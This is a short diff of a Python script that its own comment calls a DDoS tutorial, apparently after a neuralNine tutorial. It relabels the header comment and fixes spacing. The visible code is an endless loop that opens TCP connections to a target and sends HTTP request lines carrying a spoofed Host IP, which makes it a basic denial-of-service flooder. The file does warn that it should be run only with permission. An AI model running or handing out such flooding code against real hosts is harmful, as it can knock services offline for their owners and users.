@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-## email client tutorial on freecode.com done by neuralNine
+## pos ddos tutorial on freecode.com done by neuralNine
 
 ## ONLY RUN THIS ON YOUR HOMELAB OR SOMEWHERE THAT GAVE YOU PERMISSION TO
 ## Running this on anything that you DO NOT have Explicit Written Permission to do so!
@@ -20,7 +20,7 @@ fake_ip = '182.21.20.32'
 
 def attack():
     while True:
-        s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((target, port))
         s.sendto(("Get /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
         s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
